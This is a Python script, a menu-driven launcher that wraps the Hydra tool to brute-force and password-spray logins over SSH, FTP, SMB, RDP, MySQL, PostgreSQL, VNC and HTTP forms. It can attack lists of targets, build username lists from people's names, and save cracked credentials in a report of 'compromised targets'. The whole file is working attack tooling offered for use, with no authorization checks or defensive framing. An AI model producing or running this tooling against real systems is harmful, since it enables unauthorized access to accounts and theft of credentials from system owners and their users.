#!/usr/bin/env python3
import os
import subprocess
import json
import time
from datetime import datetime
from collections import defaultdict

class HydraLauncher:
    def __init__(self):
        self.protocols = {
            'ssh': 'SSH',
            'ftp': 'FTP',
            'http-get': 'HTTP GET',
            'http-post': 'HTTP POST',
            'http-post-form': 'HTTP POST Form',
            'https-get': 'HTTPS GET',
            'https-post': 'HTTPS POST',
            'https-post-form': 'HTTPS POST Form',
            'smb': 'SMB',
            'rdp': 'RDP',
            'vnc': 'VNC',
            'telnet': 'Telnet',
            'mysql': 'MySQL',
            'mssql': 'MS SQL',
            'postgres': 'PostgreSQL',
            'oracle': 'Oracle',
            'mongodb': 'MongoDB',
            'redis': 'Redis',
            'smtp': 'SMTP',
            'pop3': 'POP3',
            'imap': 'IMAP',
            'ldap': 'LDAP',
            'snmp': 'SNMP',
            'cisco': 'Cisco',
            'cisco-enable': 'Cisco Enable',
            'cvs': 'CVS',
            'firebird': 'Firebird',
            'afp': 'AFP',
            'socks5': 'SOCKS5',
            'teamspeak': 'TeamSpeak',
            'rexec': 'rexec',
            'rlogin': 'rlogin',
            'rsh': 'rsh',
            'svn': 'SVN',
            'vnc': 'VNC',
            'xmpp': 'XMPP'
        }
        
        self.output_dir = f"hydra_session_{int(datetime.now().timestamp())}"
        self.results = defaultdict(list)
        
    def check_hydra(self):
        try:
            result = subprocess.run(['hydra', '-h'], capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                return True
            
            return False
        
        except Exception:
            return False
    
    def single_target_attack(self, target, port, protocol, username=None, password=None, 
                           user_list=None, pass_list=None, threads=16, timeout=30):
        
        print(f"\033[93m[*] Launching attack on {target}:{port} ({protocol})\033[0m")
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        output_file = os.path.join(self.output_dir, f"{target}_{protocol}_{int(time.time())}.txt")
        
        cmd = ['hydra']
        
        if username:
            cmd.extend(['-l', username])
        elif user_list:
            cmd.extend(['-L', user_list])
        else:
            print(f"\033[91m[!] Username or username list required\033[0m")
            return []
        
        if password:
            cmd.extend(['-p', password])
        elif pass_list:
            cmd.extend(['-P', pass_list])
        else:
            print(f"\033[91m[!] Password or password list required\033[0m")
            return []
        
        cmd.extend(['-t', str(threads)])
        cmd.extend(['-w', str(timeout)])
        cmd.extend(['-o', output_file])
        cmd.extend(['-f'])
        cmd.extend(['-V'])
        
        if port:
            cmd.extend(['-s', str(port)])
        
        cmd.append(f"{protocol}://{target}")
        
        try:
            print(f"\033[93m[*] Running: {' '.join(cmd)}\033[0m")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
            
            credentials = self.parse_output(output_file)
            
            self.results[target].extend(credentials)
            
            if credentials:
                print(f"\033[92m[+] Found {len(credentials)} valid credentials\033[0m")
                
                for cred in credentials:
                    print(f"\033[92m  {cred}\033[0m")
            else:
                print(f"\033[91m[!] No valid credentials found\033[0m")
            
            return credentials
        
        except subprocess.TimeoutExpired:
            print(f"\033[91m[!] Attack timed out\033[0m")
            return self.parse_output(output_file)
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return []
    
    def http_form_attack(self, target, port, path, form_params, fail_string, 
                        user_list=None, pass_list=None, threads=16):
        
        print(f"\033[93m[*] Launching HTTP form attack on {target}:{port}{path}\033[0m")
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        output_file = os.path.join(self.output_dir, f"{target}_http_form_{int(time.time())}.txt")
        
        cmd = ['hydra']
        
        if user_list:
            cmd.extend(['-L', user_list])
        else:
            cmd.extend(['-l', 'admin'])
        
        if pass_list:
            cmd.extend(['-P', pass_list])
        else:
            print(f"\033[91m[!] Password list required\033[0m")
            return []
        
        cmd.extend(['-t', str(threads)])
        cmd.extend(['-o', output_file])
        cmd.extend(['-f'])
        cmd.extend(['-V'])
        
        if port:
            cmd.extend(['-s', str(port)])
        
        form_string = f"{path}:{form_params}:{fail_string}"
        
        cmd.append(f"http-post-form://{target}")
        cmd.append(form_string)
        
        try:
            print(f"\033[93m[*] Running: {' '.join(cmd)}\033[0m")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
            
            credentials = self.parse_output(output_file)
            
            self.results[target].extend(credentials)
            
            if credentials:
                print(f"\033[92m[+] Found {len(credentials)} valid credentials\033[0m")
                
                for cred in credentials:
                    print(f"\033[92m  {cred}\033[0m")
            else:
                print(f"\033[91m[!] No valid credentials found\033[0m")
            
            return credentials
        
        except subprocess.TimeoutExpired:
            print(f"\033[91m[!] Attack timed out\033[0m")
            return self.parse_output(output_file)
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return []
    
    def multi_target_attack(self, target_file, protocol, user_list, pass_list, 
                          threads=16, timeout=30):
        
        print(f"\033[93m[*] Launching multi-target attack\033[0m")
        
        if not os.path.exists(target_file):
            print(f"\033[91m[!] Target file not found\033[0m")
            return {}
        
        with open(target_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        all_results = {}
        
        for target in targets:
            print(f"\n\033[97m[*] Attacking {target}\033[0m")
            
            credentials = self.single_target_attack(target, None, protocol, 
                                                   user_list=user_list, 
                                                   pass_list=pass_list,
                                                   threads=threads,
                                                   timeout=timeout)
            
            if credentials:
                all_results[target] = credentials
        
        print(f"\n\033[92m[+] Total targets compromised: {len(all_results)}\033[0m")
        
        return all_results
    
    def password_spray_attack(self, target, protocol, user_list, password, port=None, 
                            delay=5, threads=4):
        
        print(f"\033[93m[*] Launching password spray attack: '{password}'\033[0m")
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        output_file = os.path.join(self.output_dir, f"{target}_spray_{int(time.time())}.txt")
        
        cmd = ['hydra']
        cmd.extend(['-L', user_list])
        cmd.extend(['-p', password])
        cmd.extend(['-t', str(threads)])
        cmd.extend(['-w', str(delay)])
        cmd.extend(['-o', output_file])
        cmd.extend(['-V'])
        
        if port:
            cmd.extend(['-s', str(port)])
        
        cmd.append(f"{protocol}://{target}")
        
        try:
            print(f"\033[93m[*] Running: {' '.join(cmd)}\033[0m")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
            
            credentials = self.parse_output(output_file)
            
            self.results[target].extend(credentials)
            
            if credentials:
                print(f"\033[92m[+] Found {len(credentials)} valid accounts\033[0m")
                
                for cred in credentials:
                    print(f"\033[92m  {cred}\033[0m")
            else:
                print(f"\033[91m[!] No valid accounts found\033[0m")
            
            return credentials
        
        except subprocess.TimeoutExpired:
            print(f"\033[91m[!] Attack timed out\033[0m")
            return self.parse_output(output_file)
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return []
    
    def reverse_brute_force(self, target, protocol, username, pass_list, port=None, threads=16):
        
        print(f"\033[93m[*] Launching reverse brute force for user: {username}\033[0m")
        
        return self.single_target_attack(target, port, protocol, 
                                        username=username, 
                                        pass_list=pass_list,
                                        threads=threads)
    
    def smb_attack(self, target, domain=None, user_list=None, pass_list=None, threads=16):
        
        print(f"\033[93m[*] Launching SMB attack on {target}\033[0m")
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        output_file = os.path.join(self.output_dir, f"{target}_smb_{int(time.time())}.txt")
        
        cmd = ['hydra']
        
        if user_list:
            cmd.extend(['-L', user_list])
        else:
            cmd.extend(['-l', 'administrator'])
        
        if pass_list:
            cmd.extend(['-P', pass_list])
        else:
            print(f"\033[91m[!] Password list required\033[0m")
            return []
        
        cmd.extend(['-t', str(threads)])
        cmd.extend(['-o', output_file])
        cmd.extend(['-f'])
        cmd.extend(['-V'])
        
        if domain:
            cmd.extend(['-m', domain])
        
        cmd.append(f"smb://{target}")
        
        try:
            print(f"\033[93m[*] Running: {' '.join(cmd)}\033[0m")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
            
            credentials = self.parse_output(output_file)
            
            self.results[target].extend(credentials)
            
            if credentials:
                print(f"\033[92m[+] Found {len(credentials)} valid credentials\033[0m")
                
                for cred in credentials:
                    print(f"\033[92m  {cred}\033[0m")
            else:
                print(f"\033[91m[!] No valid credentials found\033[0m")
            
            return credentials
        
        except subprocess.TimeoutExpired:
            print(f"\033[91m[!] Attack timed out\033[0m")
            return self.parse_output(output_file)
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return []
    
    def rdp_attack(self, target, user_list=None, pass_list=None, threads=4):
        
        print(f"\033[93m[*] Launching RDP attack on {target}\033[0m")
        
        return self.single_target_attack(target, 3389, 'rdp',
                                        user_list=user_list,
                                        pass_list=pass_list,
                                        threads=threads)
    
    def ssh_attack(self, target, port=22, user_list=None, pass_list=None, threads=16):
        
        print(f"\033[93m[*] Launching SSH attack on {target}:{port}\033[0m")
        
        return self.single_target_attack(target, port, 'ssh',
                                        user_list=user_list,
                                        pass_list=pass_list,
                                        threads=threads)
    
    def ftp_attack(self, target, port=21, user_list=None, pass_list=None, threads=16):
        
        print(f"\033[93m[*] Launching FTP attack on {target}:{port}\033[0m")
        
        return self.single_target_attack(target, port, 'ftp',
                                        user_list=user_list,
                                        pass_list=pass_list,
                                        threads=threads)
    
    def mysql_attack(self, target, port=3306, user_list=None, pass_list=None, threads=4):
        
        print(f"\033[93m[*] Launching MySQL attack on {target}:{port}\033[0m")
        
        return self.single_target_attack(target, port, 'mysql',
                                        user_list=user_list,
                                        pass_list=pass_list,
                                        threads=threads)
    
    def postgres_attack(self, target, port=5432, user_list=None, pass_list=None, threads=4):
        
        print(f"\033[93m[*] Launching PostgreSQL attack on {target}:{port}\033[0m")
        
        return self.single_target_attack(target, port, 'postgres',
                                        user_list=user_list,
                                        pass_list=pass_list,
                                        threads=threads)
    
    def vnc_attack(self, target, port=5900, pass_list=None, threads=4):
        
        print(f"\033[93m[*] Launching VNC attack on {target}:{port}\033[0m")
        
        return self.single_target_attack(target, port, 'vnc',
                                        username='',
                                        pass_list=pass_list,
                                        threads=threads)
    
    def parse_output(self, output_file):
        credentials = []
        
        if not os.path.exists(output_file):
            return credentials
        
        try:
            with open(output_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    if 'login:' in line and 'password:' in line:
                        credentials.append(line.strip())
        except Exception as e:
            print(f"\033[91m[!] Error parsing output: {e}\033[0m")
        
        return credentials
    
    def generate_username_list(self, names_file, output_file):
        print(f"\033[93m[*] Generating username list...\033[0m")
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        output_path = os.path.join(self.output_dir, output_file)
        
        usernames = []
        
        with open(names_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                name = line.strip()
                
                if not name:
                    continue
                
                parts = name.split()
                
                if len(parts) == 2:
                    first, last = parts
                    
                    usernames.append(first.lower())
                    usernames.append(last.lower())
                    usernames.append(f"{first[0].lower()}{last.lower()}")
                    usernames.append(f"{first.lower()}{last[0].lower()}")
                    usernames.append(f"{first.lower()}.{last.lower()}")
                    usernames.append(f"{first[0].lower()}.{last.lower()}")
                    usernames.append(f"{last.lower()}{first[0].lower()}")
                    usernames.append(f"{first.lower()}{last.lower()}")
                    usernames.append(f"{first.lower()}_{last.lower()}")
                
                elif len(parts) == 1:
                    usernames.append(parts[0].lower())
        
        with open(output_path, 'w', encoding='utf-8') as f:
            for username in set(usernames):
                f.write(username + '\n')
        
        print(f"\033[92m[+] Generated {len(set(usernames))} usernames\033[0m")
        print(f"\033[92m[+] Saved: {output_path}\033[0m")
        
        return output_path
    
    def generate_report(self):
        os.makedirs(self.output_dir, exist_ok=True)
        
        report_file = os.path.join(self.output_dir, 'hydra_report.json')
        
        total_creds = sum(len(creds) for creds in self.results.values())
        
        report = {
            'session_date': datetime.now().isoformat(),
            'output_directory': self.output_dir,
            'total_credentials': total_creds,
            'compromised_targets': len(self.results),
            'credentials': dict(self.results)
        }
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n\033[92m[+] Report saved: {report_file}\033[0m")

def run():
    print("\033[92m" + "="*70)
    print("     HYDRA BRUTE-FORCE LAUNCHER")
    print("="*70 + "\033[0m\n")
    
    hydra = HydraLauncher()
    
    if not hydra.check_hydra():
        print(f"\033[91m[!] Hydra not found. Please install: apt-get install hydra\033[0m")
        return
    
    print("\033[97mHydra Attack Options:\033[0m")
    print("\033[97m  [1] Single target attack\033[0m")
    print("\033[97m  [2] Multi-target attack\033[0m")
    print("\033[97m  [3] HTTP form attack\033[0m")
    print("\033[97m  [4] Password spray\033[0m")
    print("\033[97m  [5] SSH attack\033[0m")
    print("\033[97m  [6] FTP attack\033[0m")
    print("\033[97m  [7] SMB attack\033[0m")
    print("\033[97m  [8] RDP attack\033[0m")
    print("\033[97m  [9] MySQL attack\033[0m")
    print("\033[97m  [10] PostgreSQL attack\033[0m")
    
    choice = input(f"\n\033[95m[?] Select option: \033[0m").strip()
    
    if choice == '1':
        target = input("\033[95m[?] Target IP/hostname: \033[0m").strip()
        protocol = input("\033[95m[?] Protocol (ssh/ftp/smb/rdp): \033[0m").strip()
        port = input("\033[95m[?] Port (press Enter for default): \033[0m").strip()
        user_list = input("\033[95m[?] Username list path: \033[0m").strip()
        pass_list = input("\033[95m[?] Password list path: \033[0m").strip()
        
        hydra.single_target_attack(target, int(port) if port else None, protocol,
                                  user_list=user_list, pass_list=pass_list)
        hydra.generate_report()
    
    elif choice == '2':
        target_file = input("\033[95m[?] Target file path: \033[0m").strip()
        protocol = input("\033[95m[?] Protocol: \033[0m").strip()
        user_list = input("\033[95m[?] Username list path: \033[0m").strip()
        pass_list = input("\033[95m[?] Password list path: \033[0m").strip()
        
        hydra.multi_target_attack(target_file, protocol, user_list, pass_list)
        hydra.generate_report()
    
    elif choice == '3':
        target = input("\033[95m[?] Target IP/hostname: \033[0m").strip()
        port = input("\033[95m[?] Port (default 80): \033[0m").strip() or '80'
        path = input("\033[95m[?] Login path (e.g., /login.php): \033[0m").strip()
        form_params = input("\033[95m[?] Form params (e.g., user=^USER^&pass=^PASS^): \033[0m").strip()
        fail_string = input("\033[95m[?] Failure string (e.g., Invalid): \033[0m").strip()
        user_list = input("\033[95m[?] Username list path: \033[0m").strip()
        pass_list = input("\033[95m[?] Password list path: \033[0m").strip()
        
        hydra.http_form_attack(target, int(port), path, form_params, fail_string,
                             user_list=user_list, pass_list=pass_list)
        hydra.generate_report()
    
    elif choice == '4':
        target = input("\033[95m[?] Target IP/hostname: \033[0m").strip()
        protocol = input("\033[95m[?] Protocol: \033[0m").strip()
        user_list = input("\033[95m[?] Username list path: \033[0m").strip()
        password = input("\033[95m[?] Password to spray: \033[0m").strip()
        
        hydra.password_spray_attack(target, protocol, user_list, password)
        hydra.generate_report()
    
    elif choice == '5':
        target = input("\033[95m[?] Target IP/hostname: \033[0m").strip()
        port = input("\033[95m[?] Port (default 22): \033[0m").strip() or '22'
        user_list = input("\033[95m[?] Username list path: \033[0m").strip()
        pass_list = input("\033[95m[?] Password list path: \033[0m").strip()
        
        hydra.ssh_attack(target, int(port), user_list=user_list, pass_list=pass_list)
        hydra.generate_report()
    
    elif choice == '6':
        target = input("\033[95m[?] Target IP/hostname: \033[0m").strip()
        port = input("\033[95m[?] Port (default 21): \033[0m").strip() or '21'
        user_list = input("\033[95m[?] Username list path: \033[0m").strip()
        pass_list = input("\033[95m[?] Password list path: \033[0m").strip()
        
        hydra.ftp_attack(target, int(port), user_list=user_list, pass_list=pass_list)
        hydra.generate_report()
    
    elif choice == '7':
        target = input("\033[95m[?] Target IP/hostname: \033[0m").strip()
        domain = input("\033[95m[?] Domain (optional): \033[0m").strip() or None
        user_list = input("\033[95m[?] Username list path: \033[0m").strip()
        pass_list = input("\033[95m[?] Password list path: \033[0m").strip()
        
        hydra.smb_attack(target, domain=domain, user_list=user_list, pass_list=pass_list)
        hydra.generate_report()
    
    elif choice == '8':
        target = input("\033[95m[?] Target IP/hostname: \033[0m").strip()
        user_list = input("\033[95m[?] Username list path: \033[0m").strip()
        pass_list = input("\033[95m[?] Password list path: \033[0m").strip()
        
        hydra.rdp_attack(target, user_list=user_list, pass_list=pass_list)
        hydra.generate_report()
    
    elif choice == '9':
        target = input("\033[95m[?] Target IP/hostname: \033[0m").strip()
        port = input("\033[95m[?] Port (default 3306): \033[0m").strip() or '3306'
        user_list = input("\033[95m[?] Username list path: \033[0m").strip()
        pass_list = input("\033[95m[?] Password list path: \033[0m").strip()
        
        hydra.mysql_attack(target, int(port), user_list=user_list, pass_list=pass_list)
        hydra.generate_report()
    
    elif choice == '10':
        target = input("\033[95m[?] Target IP/hostname: \033[0m").strip()
        port = input("\033[95m[?] Port (default 5432): \033[0m").strip() or '5432'
        user_list = input("\033[95m[?] Username list path: \033[0m").strip()
        pass_list = input("\033[95m[?] Password list path: \033[0m").strip()
        
        hydra.postgres_attack(target, int(port), user_list=user_list, pass_list=pass_list)
        hydra.generate_report()
    
    print(f"\n\033[92m[+] Done\033[0m")

if __name__ == "__main__":
    run()
